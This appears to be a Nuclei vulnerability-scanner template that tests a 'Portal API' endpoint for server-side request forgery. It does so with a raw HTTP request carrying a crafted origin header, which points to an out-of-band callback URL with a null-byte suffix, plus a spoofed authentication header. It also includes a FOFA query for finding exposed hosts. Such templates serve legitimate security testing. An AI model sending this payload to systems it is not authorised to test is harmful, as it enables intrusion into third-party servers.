id: portal-api-ssrf

info:
  name: Portal API - Server Side Request Forgery
  author: ishowtess
  severity: high
  description: |
    A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.
  reference:
    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/_proxy/api/v3/"
  tags: ssrf,api,portal,http

http:
  - raw:
      - |
        GET /_proxy/api/v3/portal HTTP/2
        Host: {{Hostname}}
        X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
        X-Portal-Session-Authenticated: true

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http")'
          - 'contains(interactsh_request, "/api/v3/portal")'
        condition: and

    extractors:
      - type: regex
        name: interaction_id
        part: interactsh
        regex:
          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
# digest: 4a0a00473045022100d91623d5b6b987ec98a9d306fb2a60ba12d1667c98845b980bf6d17c7acb5ea70220436f3c2d6c6fc13ef8e624a1217ca0f54e1994799321a19769805887b7b6bf44:922c64590222798bb761d5b6d8e72950